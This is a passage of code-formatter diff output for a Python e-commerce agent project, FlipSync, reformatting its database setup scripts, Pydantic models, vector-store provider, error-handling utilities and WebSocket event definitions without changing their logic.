                     resolved BOOLEAN NOT NULL DEFAULT FALSE,
                     resolved_time TIMESTAMPTZ,
                     resolved_by VARCHAR(255),
                     resolution_notes TEXT
                 );
-            """))
+            """
+                )
+            )
 
             # Create indexes for alert_records
-            await session.execute(text("""
+            await session.execute(
+                text(
+                    """
                 CREATE INDEX IF NOT EXISTS idx_alert_records_alert_id ON alert_records(alert_id);
                 CREATE INDEX IF NOT EXISTS idx_alert_records_level ON alert_records(level);
                 CREATE INDEX IF NOT EXISTS idx_alert_records_category ON alert_records(category);
                 CREATE INDEX IF NOT EXISTS idx_alert_records_source ON alert_records(source);
                 CREATE INDEX IF NOT EXISTS idx_alert_records_timestamp ON alert_records(timestamp);
@@ -194,14 +246,18 @@
                 CREATE INDEX IF NOT EXISTS idx_alert_level_timestamp ON alert_records(level, timestamp);
                 CREATE INDEX IF NOT EXISTS idx_alert_category_timestamp ON alert_records(category, timestamp);
                 CREATE INDEX IF NOT EXISTS idx_alert_source_timestamp ON alert_records(source, timestamp);
                 CREATE INDEX IF NOT EXISTS idx_alert_acknowledged_timestamp ON alert_records(acknowledged, timestamp);
                 CREATE INDEX IF NOT EXISTS idx_alert_resolved_timestamp ON alert_records(resolved, timestamp);
-            """))
+            """
+                )
+            )
 
             # Create metric_thresholds table
-            await session.execute(text("""
+            await session.execute(
+                text(
+                    """
                 CREATE TABLE IF NOT EXISTS metric_thresholds (
                     id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
                     metric_name VARCHAR(255) NOT NULL UNIQUE,
                     warning_threshold FLOAT,
                     critical_threshold FLOAT,
@@ -211,17 +267,23 @@
                     created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
                     updated_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
                     created_by VARCHAR(255),
                     updated_by VARCHAR(255)
                 );
-            """))
+            """
+                )
+            )
 
             # Create indexes for metric_thresholds
-            await session.execute(text("""
+            await session.execute(
+                text(
+                    """
                 CREATE INDEX IF NOT EXISTS idx_metric_thresholds_metric_name ON metric_thresholds(metric_name);
                 CREATE INDEX IF NOT EXISTS idx_metric_thresholds_enabled ON metric_thresholds(enabled);
-            """))
+            """
+                )
+            )
 
             await session.commit()
             logger.info("Successfully created all metrics tables and indexes")
 
     except Exception as e:
would reformat /home/brend/Flipsync_Final/fs_agt_clean/database/init_metrics_tables.py
--- /home/brend/Flipsync_Final/fs_agt_clean/database/models/asin_data.py	2025-06-14 20:35:30.807778+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/database/models/asin_data.py	2025-06-19 04:03:59.387687+00:00
@@ -1,15 +1,16 @@
 """
 ASIN data models for Amazon product information.
 """
+
 from typing import List, Optional
 from pydantic import BaseModel, Field, ConfigDict
 
 
 class ASINData(BaseModel):
     """Amazon Standard Identification Number (ASIN) data model."""
-    
+
     asin: str = Field(..., description="Amazon Standard Identification Number")
     title: str = Field(..., description="Product title")
     brand: Optional[str] = Field(None, description="Product brand")
     description: Optional[str] = Field(None, description="Product description")
     price: Optional[float] = Field(None, description="Product price")
@@ -18,58 +19,59 @@
     features: Optional[List[str]] = Field(None, description="Product features")
     categories: Optional[List[str]] = Field(None, description="Product categories")
     rating: Optional[float] = Field(None, description="Product rating")
     review_count: Optional[int] = Field(None, description="Number of reviews")
     availability: Optional[str] = Field(None, description="Product availability status")
-    
+
     class Config:
         """Pydantic model configuration."""
-        
+
         json_schema_extra = {
             "example": {
                 "asin": "B07PXGQC1Q",
                 "title": "Echo Dot (3rd Gen) - Smart speaker with Alexa",
                 "brand": "Amazon",
                 "description": "Use your voice to play music, answer questions, read the news, check the weather, set alarms, control compatible smart home devices, and more.",
                 "price": 39.99,
                 "currency": "USD",
-                "images": ["https://images-na.ssl-images-amazon.com/images/I/61MZfO8hGgL._SL1000_.jpg"],
-                "features": ["Voice control your music", "Control your smart home", "Make calls and send messages"],
+                "images": [
+                    "https://images-na.ssl-images-amazon.com/images/I/61MZfO8hGgL._SL1000_.jpg"
+                ],
+                "features": [
+                    "Voice control your music",
+                    "Control your smart home",
+                    "Make calls and send messages",
+                ],
                 "categories": ["Electronics", "Smart Home", "Speakers"],
                 "rating": 4.7,
                 "review_count": 193651,
-                "availability": "In Stock"
+                "availability": "In Stock",
             }
         }
 
 
 class ASINSearchRequest(BaseModel):
     """Request model for ASIN search."""
-    
+
     query: str = Field(..., description="Search query")
     marketplace: Optional[str] = Field("US", description="Amazon marketplace")
-    
+
     class Config:
         """Pydantic model configuration."""
-        
-        json_schema_extra = {
-            "example": {
-                "query": "echo dot",
-                "marketplace": "US"
-            }
-        }
+
+        json_schema_extra = {"example": {"query": "echo dot", "marketplace": "US"}}
 
 
 class ASINSearchResponse(BaseModel):
     """Response model for ASIN search."""
-    
+
     results: List[ASINData] = Field(..., description="Search results")
     total: int = Field(..., description="Total number of results")
-    
+
     class Config:
         """Pydantic model configuration."""
-        
+
         json_schema_extra = {
             "example": {
                 "results": [
                     {
                         "asin": "B07PXGQC1Q",
@@ -77,11 +79,11 @@
                         "brand": "Amazon",
                         "price": 39.99,
                         "currency": "USD",
                         "rating": 4.7,
                         "review_count": 193651,
-                        "availability": "In Stock"
+                        "availability": "In Stock",
                     }
                 ],
-                "total": 1
+                "total": 1,
             }
         }
would reformat /home/brend/Flipsync_Final/fs_agt_clean/database/models/asin_data.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/vector_store/providers/qdrant.py	2025-06-14 20:35:30.807778+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/vector_store/providers/qdrant.py	2025-06-19 04:03:59.413265+00:00
@@ -614,11 +614,13 @@
                 vectors_config=models.VectorParams(
                     size=dimension, distance=self.distance_metric
                 ),
             )
 
-            logger.info(f"Created Qdrant collection '{collection_name}' with dimension {dimension}")
+            logger.info(
+                f"Created Qdrant collection '{collection_name}' with dimension {dimension}"
+            )
             return True
         except Exception as e:
             logger.error(f"Error creating collection '{collection_name}': {e}")
             return False
 
@@ -667,19 +669,21 @@
                 raise ValueError("Number of products and vectors must match")
 
             # Convert products to metadata dictionaries
             metadatas = []
             for product in products:
-                if hasattr(product, 'to_dict'):
+                if hasattr(product, "to_dict"):
                     metadatas.append(product.to_dict())
                 elif isinstance(product, dict):
                     metadatas.append(product)
                 else:
                     metadatas.append({"product": str(product)})
 
             # Use existing add_vectors method
-            await self.add_vectors(vectors=vectors, metadatas=metadatas, batch_size=batch_size)
+            await self.add_vectors(
+                vectors=vectors, metadatas=metadatas, batch_size=batch_size
+            )
             return True
         except Exception as e:
             logger.error(f"Error upserting products: {e}")
             return False
 
@@ -705,11 +709,11 @@
             # Use existing search_by_vector method
             results = await self.search_by_vector(
                 vector=query_vector,
                 limit=limit,
                 filters=filter_conditions,
-                include_metadata=True
+                include_metadata=True,
             )
 
             # Filter by score threshold
             if score_threshold > 0.0:
                 results = [r for r in results if r.score >= score_threshold]
@@ -757,21 +761,21 @@
                 "vectors_count": collection_info.vectors_count or 0,
                 "status": collection_info.status,
                 "config": {
                     "distance": str(self.distance_metric),
                     "vector_size": self.dimension,
-                }
+                },
             }
         except Exception as e:
             logger.error(f"Error getting collection info: {e}")
             return {
                 "name": self.store_id,
                 "dimension": self.dimension,
                 "distance_metric": str(self.distance_metric),
                 "vectors_count": 0,
                 "status": "error",
-                "error": str(e)
+                "error": str(e),
             }
 
     async def get_collection_stats(self) -> Dict[str, Any]:
         """Get collection statistics.
 
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/vector_store/providers/qdrant.py
--- /home/brend/Flipsync_Final/fs_agt_clean/database/models/enums.py	2025-06-14 20:35:30.807778+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/database/models/enums.py	2025-06-19 04:03:59.458454+00:00
@@ -7,57 +7,64 @@
 from enum import Enum
 
 
 class AccountStatus(Enum):
     """Account status enumeration."""
+
     ACTIVE = "active"
     INACTIVE = "inactive"
     SUSPENDED = "suspended"
     PENDING = "pending"
 
 
 class AccountType(Enum):
     """Account type enumeration."""
+
     BASIC = "basic"
     PREMIUM = "premium"
     ENTERPRISE = "enterprise"
     TRIAL = "trial"
 
 
 class SyncStatus(Enum):
     """Sync status enumeration."""
+
     SYNCED = "synced"
     PENDING = "pending"
     FAILED = "failed"
     IN_PROGRESS = "in_progress"
 
 
 class UserRole(Enum):
     """User role enumeration."""
+
     USER = "user"
     ADMIN = "admin"
     MODERATOR = "moderator"
     SUPER_ADMIN = "super_admin"
 
 
 class NotificationStatus(Enum):
     """Notification status enumeration."""
+
     PENDING = "pending"
     SENT = "sent"
     FAILED = "failed"
     READ = "read"
 
 
 class NotificationType(Enum):
     """Notification type enumeration."""
+
     EMAIL = "email"
     PUSH = "push"
     SMS = "sms"
     IN_APP = "in_app"
 
 
 class Priority(Enum):
     """Priority enumeration."""
+
     LOW = "low"
     MEDIUM = "medium"
     HIGH = "high"
     CRITICAL = "critical"
would reformat /home/brend/Flipsync_Final/fs_agt_clean/database/models/enums.py
--- /home/brend/Flipsync_Final/fs_agt_clean/database/error_handling.py	2025-06-14 20:35:30.807778+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/database/error_handling.py	2025-06-19 04:03:59.501489+00:00
@@ -1,8 +1,9 @@
 """
 Error handling utilities for database operations.
 """
+
 import asyncio
 import functools
 import logging
 import time
 from datetime import datetime
@@ -18,45 +19,49 @@
 F = TypeVar("F", bound=Callable[..., Any])
 
 
 class DatabaseError(Exception):
     """Base exception for database errors."""
-    
+
     def __init__(self, message: str, original_error: Optional[Exception] = None):
         """Initialize the exception."""
         self.message = message
         self.original_error = original_error
         super().__init__(message)
 
 
 class ConnectionError(DatabaseError):
     """Exception for database connection errors."""
+
     pass
 
 
 class QueryError(DatabaseError):
     """Exception for database query errors."""
+
     pass
 
 
 class TransactionError(DatabaseError):
     """Exception for database transaction errors."""
+
     pass
 
 
 class IntegrityViolationError(DatabaseError):
     """Exception for database integrity violation errors."""
+
     pass
 
 
 def map_exception(error: Exception) -> DatabaseError:
     """
     Map SQLAlchemy exceptions to our custom exceptions.
-    
+
     Args:
         error: The original SQLAlchemy exception
-        
+
     Returns:
         A custom database exception
     """
     if isinstance(error, IntegrityError):
         return IntegrityViolationError(
@@ -78,29 +83,29 @@
     backoff_factor: float = 2.0,
     retryable_errors: Optional[List[Type[Exception]]] = None,
 ) -> Callable[[F], F]:
     """
     Decorator for retrying database operations on transient errors.
-    
+
     Args:
         max_retries: Maximum number of retry attempts
         retry_delay: Initial delay between retries in seconds
         backoff_factor: Factor to increase delay between retries
         retryable_errors: List of exception types to retry on
-        
+
     Returns:
         Decorated function
     """
     if retryable_errors is None:
         retryable_errors = [OperationalError, ConnectionError]
-    
+
     def decorator(func: F) -> F:
         @functools.wraps(func)
         async def wrapper(*args: Any, **kwargs: Any) -> Any:
             last_error = None
             current_delay = retry_delay
-            
+
             for attempt in range(max_retries + 1):
                 try:
                     return await func(*args, **kwargs)
                 except tuple(retryable_errors) as e:
                     last_error = e
@@ -122,19 +127,19 @@
                         )
                 except Exception as e:
                     # Non-retryable error
                     logger.error("Non-retryable error: %s", str(e))
                     raise map_exception(e)
-            
+
             # If we get here, all retries failed
             if last_error:
                 raise map_exception(last_error)
             else:
                 raise DatabaseError("Operation failed for unknown reason")
-        
+
         return cast(F, wrapper)
-    
+
     return decorator
 
 
 async def execute_with_retry(
     session: AsyncSession,
@@ -145,26 +150,26 @@
     backoff_factor: float = 2.0,
     **kwargs: Any,
 ) -> Any:
     """
     Execute a database operation with retry logic.
-    
+
     Args:
         session: The database session
         operation: The operation to execute
         *args: Arguments to pass to the operation
         max_retries: Maximum number of retry attempts
         retry_delay: Initial delay between retries in seconds
         backoff_factor: Factor to increase delay between retries
         **kwargs: Keyword arguments to pass to the operation
-        
+
     Returns:
         The result of the operation
     """
     last_error = None
     current_delay = retry_delay
-    
+
     for attempt in range(max_retries + 1):
         try:
             return await operation(session, *args, **kwargs)
         except (OperationalError, ConnectionError) as e:
             last_error = e
@@ -186,52 +191,52 @@
                 )
         except Exception as e:
             # Non-retryable error
             logger.error("Non-retryable error: %s", str(e))
             raise map_exception(e)
-    
+
     # If we get here, all retries failed
     if last_error:
         raise map_exception(last_error)
     else:
         raise DatabaseError("Operation failed for unknown reason")
 
 
 class TransactionMetrics:
     """Metrics for database transactions."""
-    
+
     def __init__(self):
         """Initialize the metrics."""
         self.start_time: Optional[float] = None
         self.end_time: Optional[float] = None
         self.operation_name: str = ""
         self.success: bool = False
         self.error: Optional[str] = None
         self.retries: int = 0
-    
+
     def start(self, operation_name: str) -> None:
         """Start tracking a transaction."""
         self.start_time = time.time()
         self.operation_name = operation_name
-    
+
     def end(self, success: bool, error: Optional[str] = None) -> None:
         """End tracking a transaction."""
         self.end_time = time.time()
         self.success = success
         self.error = error
-    
+
     def increment_retry(self) -> None:
         """Increment the retry count."""
         self.retries += 1
-    
+
     @property
     def duration(self) -> Optional[float]:
         """Get the transaction duration in seconds."""
         if self.start_time is not None and self.end_time is not None:
             return self.end_time - self.start_time
         return None
-    
+
     def to_dict(self) -> Dict[str, Any]:
         """Convert the metrics to a dictionary."""
         return {
             "operation": self.operation_name,
             "success": self.success,
@@ -243,111 +248,110 @@
 
 
 def with_metrics(operation_name: str) -> Callable[[F], F]:
     """
     Decorator for tracking database operation metrics.
-    
+
     Args:
         operation_name: The name of the operation
-        
+
     Returns:
         Decorated function
     """
+
     def decorator(func: F) -> F:
         @functools.wraps(func)
         async def wrapper(*args: Any, **kwargs: Any) -> Any:
             metrics = TransactionMetrics()
             metrics.start(operation_name)
-            
+
             try:
                 result = await func(*args, **kwargs)
                 metrics.end(True)
                 return result
             except Exception as e:
                 metrics.end(False, str(e))
-                
+
                 # Log metrics for failed operations
                 logger.error(
                     "Database operation failed: %s",
                     metrics.to_dict(),
                 )
-                
+
                 raise
             finally:
                 # Record metrics (in a real implementation, this would send to a metrics service)
                 if metrics.duration and metrics.duration > 1.0:
                     logger.warning(
                         "Slow database operation: %s took %.2f seconds",
                         operation_name,
                         metrics.duration,
                     )
-        
+
         return cast(F, wrapper)
-    
+
     return decorator
 
 
 class TransactionContext:
     """Context manager for database transactions with error handling."""
-    
+
     def __init__(
         self,
         session: AsyncSession,
         operation_name: str,
         max_retries: int = 3,
     ):
         """
         Initialize the transaction context.
-        
+
         Args:
             session: The database session
             operation_name: The name of the operation
             max_retries: Maximum number of retry attempts
         """
         self.session = session
         self.operation_name = operation_name
         self.max_retries = max_retries
         self.metrics = TransactionMetrics()
         self.attempt = 0
-    
+
     async def __aenter__(self) -> "TransactionContext":
         """Enter the transaction context."""
         self.metrics.start(self.operation_name)
         self.attempt += 1
         await self.session.begin()
         return self
-    
+
     async def __aexit__(
         self,
         exc_type: Optional[Type[BaseException]],
         exc_val: Optional[BaseException],
         exc_tb: Optional[Any],
     ) -> bool:
         """
         Exit the transaction context.
-        
+
         Args:
             exc_type: The exception type, if any
             exc_val: The exception value, if any
             exc_tb: The exception traceback, if any
-            
+
         Returns:
             True if the exception was handled, False otherwise
         """
         if exc_type is None:
             # No exception, commit the transaction
             try:
                 await self.session.commit()
                 self.metrics.end(True)
                 return False  # Don't suppress any exceptions
             except Exception as e:
-                logger.error(
-                    "Error committing transaction: %s", str(e)
-                )
+                logger.error("Error committing transaction: %s", str(e))
                 await self.session.rollback()
                 self.metrics.end(False, str(e))
-                
+
                 # Check if we should retry
                 if self.attempt <= self.max_retries and isinstance(
                     e, (OperationalError, ConnectionError)
                 ):
                     self.metrics.increment_retry()
@@ -356,18 +360,18 @@
                         self.attempt,
                         self.max_retries,
                         self.operation_name,
                     )
                     return False  # Don't suppress the exception, let the retry logic handle it
-                
+
                 # Map the exception to our custom exception
                 raise map_exception(e)
         else:
             # Exception occurred, rollback the transaction
             await self.session.rollback()
             self.metrics.end(False, str(exc_val))
-            
+
             # Check if we should retry
             if self.attempt <= self.max_retries and issubclass(
                 exc_type, (OperationalError, ConnectionError)
             ):
                 self.metrics.increment_retry()
@@ -375,14 +379,16 @@
                     "Retrying transaction (attempt %s/%s): %s",
                     self.attempt,
                     self.max_retries,
                     self.operation_name,
                 )
-                return False  # Don't suppress the exception, let the retry logic handle it
-            
+                return (
+                    False  # Don't suppress the exception, let the retry logic handle it
+                )
+
             # Log metrics for failed operations
             logger.error(
                 "Transaction failed: %s",
                 self.metrics.to_dict(),
             )
-            
+
             return False  # Don't suppress the exception
would reformat /home/brend/Flipsync_Final/fs_agt_clean/database/error_handling.py
--- /home/brend/Flipsync_Final/fs_agt_clean/database/init_chat_tables.py	2025-06-14 20:35:30.807778+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/database/init_chat_tables.py	2025-06-19 04:03:59.559306+00:00
@@ -1,10 +1,10 @@
 """
 Database Initialization Script for Chat and Agent Tables
 ========================================================
 
-This script initializes the database tables for chat conversations, messages, 
+This script initializes the database tables for chat conversations, messages,
 agent status, and agent decisions.
 """
 
 import asyncio
 import logging
@@ -17,171 +17,174 @@
 from fs_agt_clean.database.models.base import Base
 from fs_agt_clean.database.models.chat import (
     Conversation,
     Message,
     ChatSession,
-    MessageReaction
+    MessageReaction,
 )
 from fs_agt_clean.database.models.agents import (
     AgentStatus,
     AgentDecision,
     AgentPerformanceMetric,
     AgentCommunication,
-    AgentTask
+    AgentTask,
 )
 
 logger = logging.getLogger(__name__)
 
 
 async def create_chat_and_agent_tables(
-    connection_string: str = "postgresql+asyncpg://postgres:password@localhost:5432/flipsync_dev"
+    connection_string: str = "postgresql+asyncpg://postgres:password@localhost:5432/flipsync_dev",
 ):
     """Create chat and agent tables in the database.
-    
+
     Args:
         connection_string: Database connection string
     """
     try:
         # Create async engine
         engine = create_async_engine(
             connection_string,
             echo=True,  # Set to False in production
             pool_size=5,
-            max_overflow=10
+            max_overflow=10,
         )
-        
+
         logger.info("Creating chat and agent tables...")
-        
+
         # Create all tables
         async with engine.begin() as conn:
             # Import all models to ensure they're registered
             logger.info("Importing models...")
-            
+
             # Create tables
             await conn.run_sync(Base.metadata.create_all)
             logger.info("Successfully created all tables")
-        
+
         # Test the tables by creating a sample conversation
-        async_session = sessionmaker(engine, class_=AsyncSession, expire_on_commit=False)
-        
+        async_session = sessionmaker(
+            engine, class_=AsyncSession, expire_on_commit=False
+        )
+
         async with async_session() as session:
             # Create a test conversation
             test_conversation = Conversation(
-                user_id=uuid.UUID("550e8400-e29b-41d4-a716-446655440000"),  # Sample UUID
+                user_id=uuid.UUID(
+                    "550e8400-e29b-41d4-a716-446655440000"
+                ),  # Sample UUID
                 title="Test Conversation",
-                extra_metadata={"test": True}
+                extra_metadata={"test": True},
             )
             session.add(test_conversation)
             await session.commit()
-            
+
             # Create a test message
             test_message = Message(
                 conversation_id=test_conversation.id,
                 content="Hello, this is a test message",
                 sender="user",
-                extra_metadata={"test": True}
+                extra_metadata={"test": True},
             )
             session.add(test_message)
-            
+
             # Create a test agent status
             test_agent_status = AgentStatus(
                 agent_id="market_agent_001",
                 agent_type="market",
                 status="running",
                 metrics={
                     "cpu_usage": 45.2,
                     "memory_usage": 62.8,
-                    "requests_per_minute": 120
+                    "requests_per_minute": 120,
                 },
-                config={"max_concurrent_tasks": 10}
+                config={"max_concurrent_tasks": 10},
             )
             session.add(test_agent_status)
-            
+
             # Create a test agent decision
             test_decision = AgentDecision(
                 agent_id="market_agent_001",
                 decision_type="pricing",
                 parameters={
                     "product_id": "ASIN123456",
                     "current_price": 29.99,
-                    "recommended_price": 27.99
+                    "recommended_price": 27.99,
                 },
                 confidence=0.85,
-                rationale="Competitor analysis suggests lowering price by 7% to increase sales"
+                rationale="Competitor analysis suggests lowering price by 7% to increase sales",
             )
             session.add(test_decision)
-            
+
             await session.commit()
-            
+
             logger.info("Successfully created test data")
-            
+
             # Verify the data was created
             from sqlalchemy import text
+
             conversations = await session.execute(
                 text("SELECT COUNT(*) FROM conversations")
             )
-            messages = await session.execute(
-                text("SELECT COUNT(*) FROM messages")
-            )
+            messages = await session.execute(text("SELECT COUNT(*) FROM messages"))
             agent_statuses = await session.execute(
                 text("SELECT COUNT(*) FROM agent_status")
             )
             agent_decisions = await session.execute(
                 text("SELECT COUNT(*) FROM agent_decisions")
             )
-            
+
             conv_count = conversations.scalar()
             msg_count = messages.scalar()
             status_count = agent_statuses.scalar()
             decision_count = agent_decisions.scalar()
-            
+
             logger.info(f"Database verification:")
             logger.info(f"  Conversations: {conv_count}")
             logger.info(f"  Messages: {msg_count}")
             logger.info(f"  Agent Statuses: {status_count}")
             logger.info(f"  Agent Decisions: {decision_count}")
-        
+
         await engine.dispose()
         logger.info("Database initialization completed successfully")
-        
+
     except Exception as e:
         logger.error(f"Error creating tables: {e}")
         raise
 
 
 async def drop_chat_and_agent_tables(
-    connection_string: str = "postgresql+asyncpg://postgres:password@localhost:5432/flipsync_dev"
+    connection_string: str = "postgresql+asyncpg://postgres:password@localhost:5432/flipsync_dev",
 ):
     """Drop chat and agent tables from the database.
-    
+
     Args:
         connection_string: Database connection string
     """
     try:
         # Create async engine
         engine = create_async_engine(connection_string, echo=True)
-        
+
         logger.info("Dropping chat and agent tables...")
-        
+
         # Drop all tables
         async with engine.begin() as conn:
             await conn.run_sync(Base.metadata.drop_all)
             logger.info("Successfully dropped all tables")
-        
+
         await engine.dispose()
         logger.info("Database cleanup completed successfully")
-        
+
     except Exception as e:
         logger.error(f"Error dropping tables: {e}")
         raise
 
 
 async def reset_database(
-    connection_string: str = "postgresql+asyncpg://postgres:password@localhost:5432/flipsync_dev"
+    connection_string: str = "postgresql+asyncpg://postgres:password@localhost:5432/flipsync_dev",
 ):
     """Reset the database by dropping and recreating all tables.
-    
+
     Args:
         connection_string: Database connection string
     """
     logger.info("Resetting database...")
     await drop_chat_and_agent_tables(connection_string)
@@ -189,24 +192,25 @@
     logger.info("Database reset completed")
 
 
 if __name__ == "__main__":
     import sys
-    
+
     # Configure logging
     logging.basicConfig(
         level=logging.INFO,
-        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
+        format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
     )
-    
+
     # Get connection string from environment or use default
     import os
+
     connection_string = os.getenv(
-        "DATABASE_URL", 
-        "postgresql+asyncpg://postgres:password@localhost:5432/flipsync_dev"
+        "DATABASE_URL",
+        "postgresql+asyncpg://postgres:password@localhost:5432/flipsync_dev",
     )
-    
+
     # Parse command line arguments
     if len(sys.argv) > 1:
         command = sys.argv[1]
         if command == "create":
             asyncio.run(create_chat_and_agent_tables(connection_string))
would reformat /home/brend/Flipsync_Final/fs_agt_clean/database/init_chat_tables.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/websocket/events.py	2025-06-16 22:47:50.084194+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/websocket/events.py	2025-06-19 04:03:59.605342+00:00
@@ -13,23 +13,24 @@
 import uuid
 
 
 class EventType(str, Enum):
     """WebSocket event types."""
+
     # Connection events
     CONNECTION_ESTABLISHED = "connection_established"
     CONNECTION_CONFIRMED = "connection_confirmed"
     PING = "ping"
     PONG = "pong"
-    
+
     # Chat events
     MESSAGE = "message"
     TYPING = "typing"
     MESSAGE_REACTION = "message_reaction"
     MESSAGE_EDIT = "message_edit"
     MESSAGE_DELETE = "message_delete"
-    
+
     # Agent events
     AGENT_STATUS = "agent_status"
     AGENT_DECISION = "agent_decision"
     AGENT_TASK_UPDATE = "agent_task_update"
     AGENT_METRIC = "agent_metric"
@@ -45,62 +46,70 @@
     # Approval workflow events
     APPROVAL_REQUIRED = "approval_required"
     APPROVAL_APPROVED = "approval_approved"
     APPROVAL_REJECTED = "approval_rejected"
     APPROVAL_ESCALATED = "approval_escalated"
-    
+
     # System events
     SYSTEM_ALERT = "system_alert"
     SYSTEM_NOTIFICATION = "system_notification"
     ERROR = "error"
     RATE_LIMIT_EXCEEDED = "rate_limit_exceeded"
-    
+
     # Conversation events
     CONVERSATION_CREATED = "conversation_created"
     CONVERSATION_UPDATED = "conversation_updated"
     USER_JOINED = "user_joined"
     USER_LEFT = "user_left"
 
 
 class SenderType(str, Enum):
     """Message sender types."""
+
     USER = "user"
     AGENT = "agent"
     SYSTEM = "system"
 
 
 class AgentType(str, Enum):
     """Agent types for routing and identification."""
+
     MARKET = "market"
     EXECUTIVE = "executive"
     CONTENT = "content"
     LOGISTICS = "logistics"
     ASSISTANT = "assistant"
 
 
 class MessageStatus(str, Enum):
     """Message status types."""
+
     SENT = "sent"
     DELIVERED = "delivered"
     READ = "read"
     FAILED = "failed"
 
 
 class BaseWebSocketEvent(BaseModel):
     """Base WebSocket event structure."""
+
     type: EventType
-    timestamp: str = Field(default_factory=lambda: datetime.now(timezone.utc).isoformat())
+    timestamp: str = Field(
+        default_factory=lambda: datetime.now(timezone.utc).isoformat()
+    )
     event_id: str = Field(default_factory=lambda: str(uuid.uuid4()))
 
 
 class ConnectionEvent(BaseWebSocketEvent):
     """Connection-related events."""
+
     data: Dict[str, Any] = Field(default_factory=dict)
 
 
 class ChatMessageData(BaseModel):
     """Chat message data structure."""
+
     id: str
     conversation_id: str
     content: str
     sender: SenderType
     agent_type: Optional[AgentType] = None
@@ -111,63 +120,71 @@
     metadata: Dict[str, Any] = Field(default_factory=dict)
 
 
 class ChatMessageEvent(BaseWebSocketEvent):
     """Chat message event."""
+
     type: EventType = EventType.MESSAGE
     conversation_id: str
     data: ChatMessageData
 
 
 class TypingIndicatorData(BaseModel):
     """Typing indicator data."""
+
     user_id: Optional[str] = None
     agent_type: Optional[AgentType] = None
     is_typing: bool
     conversation_id: str
 
 
 class TypingEvent(BaseWebSocketEvent):
     """Typing indicator event."""
+
     type: EventType = EventType.TYPING
     conversation_id: str
     data: TypingIndicatorData
 
 
 class MessageReactionData(BaseModel):
     """Message reaction data."""
+
     message_id: str
     user_id: str
     reaction_type: str  # 'like', 'dislike', 'helpful', 'not_helpful'
     action: str  # 'add' or 'remove'
 
 
 class MessageReactionEvent(BaseWebSocketEvent):
     """Message reaction event."""
+
     type: EventType = EventType.MESSAGE_REACTION
     conversation_id: str
     data: MessageReactionData
 
 
 class AgentStatusData(BaseModel):
     """Agent status data."""
+
     agent_id: str
     agent_type: AgentType
     status: str  # 'running', 'stopped', 'error', 'idle'
     metrics: Dict[str, Any] = Field(default_factory=dict)
     last_activity: Optional[str] = None
     error_message: Optional[str] = None
 
 
 class AgentStatusEvent(BaseWebSocketEvent):
     """Agent status update event."""
+
     type: EventType = EventType.AGENT_STATUS
     data: AgentStatusData
 
 
 class AgentDecisionData(BaseModel):
     """Agent decision data."""
+
     decision_id: str
     agent_id: str
     agent_type: AgentType
     decision_type: str
     parameters: Dict[str, Any] = Field(default_factory=dict)
@@ -177,16 +194,18 @@
     requires_approval: bool = True
 
 
 class AgentDecisionEvent(BaseWebSocketEvent):
     """Agent decision event."""
+
     type: EventType = EventType.AGENT_DECISION
     data: AgentDecisionData
 
 
 class AgentTaskData(BaseModel):
     """Agent task data."""
+
     task_id: str
     agent_id: str
     task_type: str
     task_name: str
     status: str  # 'queued', 'running', 'completed', 'failed'
@@ -195,16 +214,18 @@
     error_message: Optional[str] = None
 
 
 class AgentTaskEvent(BaseWebSocketEvent):
     """Agent task update event."""
+
     type: EventType = EventType.AGENT_TASK_UPDATE
     data: AgentTaskData
 
 
 class SystemAlertData(BaseModel):
     """System alert data."""
+
     alert_id: str
     severity: str  # 'info', 'warning', 'error', 'critical'
     title: str
     message: str
     source: str
@@ -212,46 +233,52 @@
     action_url: Optional[str] = None
 
 
 class SystemAlertEvent(BaseWebSocketEvent):
     """System alert event."""
+
     type: EventType = EventType.SYSTEM_ALERT
     data: SystemAlertData
 
 
 class ErrorData(BaseModel):
     """Error event data."""
+
     error_code: str
     error_message: str
     details: Optional[Dict[str, Any]] = None
     retry_after: Optional[int] = None
 
 
 class ErrorEvent(BaseWebSocketEvent):
     """Error event."""
+
     type: EventType = EventType.ERROR
     data: ErrorData
 
 
 class ConversationData(BaseModel):
     """Conversation data."""
+
     conversation_id: str
     title: Optional[str] = None
     participants: List[str] = Field(default_factory=list)
     created_at: str
     updated_at: str
     metadata: Dict[str, Any] = Field(default_factory=dict)
 
 
 class ConversationEvent(BaseWebSocketEvent):
     """Conversation event."""
+
     conversation_id: str
     data: ConversationData
 
 
 class ApprovalWorkflowData(BaseModel):
     """Approval workflow data structure."""
+
     approval_id: str
     decision_type: str
     confidence: float
     auto_approve: bool
     escalation_required: bool
@@ -266,17 +293,19 @@
     updated_at: Optional[str] = None
 
 
 class ApprovalEvent(BaseWebSocketEvent):
     """Approval workflow event."""
+
     type: EventType
     conversation_id: str
     data: ApprovalWorkflowData
 
 
 class AgentResponseStreamData(BaseModel):
     """Agent response streaming data."""
+
     message_id: str
     conversation_id: str
     content: str
     agent_type: AgentType
     is_streaming: bool = True
@@ -287,17 +316,19 @@
     metadata: Dict[str, Any] = Field(default_factory=dict)
 
 
 class AgentResponseStreamEvent(BaseWebSocketEvent):
     """Agent response streaming event."""
+
     type: EventType = EventType.AGENT_RESPONSE_STREAM
     conversation_id: str
     data: AgentResponseStreamData
 
 
 class WorkflowData(BaseModel):
     """Workflow coordination data."""
+
     workflow_id: str
     workflow_type: str
     participating_agents: List[str]
     status: str  # 'started', 'running', 'completed', 'failed'
     progress: float = 0.0  # 0.0 to 1.0
@@ -309,17 +340,19 @@
     updated_at: str
 
 
 class WorkflowEvent(BaseWebSocketEvent):
     """Workflow coordination event."""
+
     type: EventType
     conversation_id: Optional[str] = None
     data: WorkflowData
 
 
 class AgentCoordinationData(BaseModel):
     """Agent coordination data."""
+
     coordination_id: str
     coordinating_agents: List[str]
     task: str
     progress: float = 0.0  # 0.0 to 1.0
     current_phase: str
@@ -327,10 +360,11 @@
     context: Dict[str, Any] = Field(default_factory=dict)
 
 
